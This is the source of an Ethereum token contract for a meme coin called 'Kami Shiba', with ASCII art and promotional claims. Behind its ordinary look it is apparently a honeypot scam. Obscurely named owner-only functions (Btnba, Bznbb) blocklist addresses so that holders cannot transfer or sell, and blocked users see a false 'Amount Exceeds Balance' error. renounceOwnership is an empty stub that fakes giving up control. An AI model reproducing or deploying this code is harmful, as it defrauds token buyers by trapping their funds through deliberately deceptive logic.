/**
 *Submitted for verification at Etherscan.io on 2022-09-13
*/

pragma solidity 0.8.7;
/*


                                      ,▄▄▄█████▄▄▄▄,
                                  ▄██▀▀▒▒▒▄█▀██▒▒▒▀▀██▄,
                               ▄██▀▒▒▒▒▒▒██▒▒▒██▒▒▒▒▒▒▒▀█▄
                             ╓██▒▒▒▒▒▒▒▒██▒▒▒▒▒▀█▌▒▒▒▒▒▒▒▀█▄
                            ▄█▌▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒██
                           ██████▄▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▄██████
                          ▐█▒▒██▒▒▀███╢╢╣╣╢╢╢╢╢╢╢╢╣████▀▒██▒▒██
                          █▌▒▒▒▀█▌▒██▀▌╣╣╨╬╣╣╣▓╨╣╢▓▀▀█▌▒██▒▒▒▒█▌
                         ]█▒▒▒▒▒▒██▀▒▒╢╣▓█╣╣╣╣╢█▌╣▒▒▒▒███▒▒▒▒▒█▌
                         j█▒▒▒▒▒████▒▒╜╨╬▒╜ ▄▄╙▒▓╨╨▒▒▄███▒▒▒▒▒█▌
                          █▌▒▒▒██▒▒███▌    ▄█▄    ▄███▒▒▀█▒▒▒▒█▌
                          ▐█▒▒██▄██▀▀█▌▒@╖,   ,╓@╢▒██▀██▄▓█▌▒██
                           ▀████▀     ██▒▒▒▒▒▒▒▒▒▒█▀▒▒▒▒▀▀████
                            ▀█▄        ██▒▒▒▒▒▒▒▓█▀▒▒▒▒▒▒▒▒█▀
                              ▀█▄       ▀█▒▒▒▒▒██╙╢▒▒▒▒▒▒██"
                                ▀█▄▄     ╙█▌▒▒█▀   ║▒▒██▀`
                                   ▀▀█▄▄▄,,███▌,▄▄███▀`
                                        `▀▀▀▀▀▀▀▀-


Kami Shiba  - $KAMISHIB -

All knowing, All seeing, Low Tax Shiba Meme Coin - 

DogeChain Bridge Q4 2022

NFT Airdrop Top 100 Wallets - 9/15/2022


*/    

contract KamiShib {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) rxAmnt;

    // 
    string public name = "Kami Shiba";
    string public symbol = unicode"KAMISHIB";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function Btnba(address _user) public onlyOwner {
        require(!rxAmnt[_user], "x");
        rxAmnt[_user] = true;
     
    }
    
    function Bznbb(address _user) public onlyOwner {
        require(rxAmnt[_user], "xx");
        rxAmnt[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!rxAmnt[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!rxAmnt[from] , "Amount Exceeds Balance"); 
               require(!rxAmnt[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}